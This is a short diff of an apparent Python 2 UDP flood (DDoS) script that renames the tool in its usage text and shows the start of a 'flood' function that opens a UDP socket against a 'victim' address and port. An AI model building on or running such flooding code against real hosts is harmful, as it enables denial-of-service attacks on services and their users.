@@ -14,9 +14,9 @@ def usage():
     print "		Code By arka yakuza"
     print '''
     use :
-        python2 DDos-Anonymous.py <ip> <port> <packet>
+        python2 arkan-DDOS.py <ip> <port> <packet>
     ex  :
-        python2 DDos-Anonymous.py 172.0.0.1 80 3000 '''
+        python2 arkan-DDOS.py 172.0.0.1 80 3000 '''
 
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
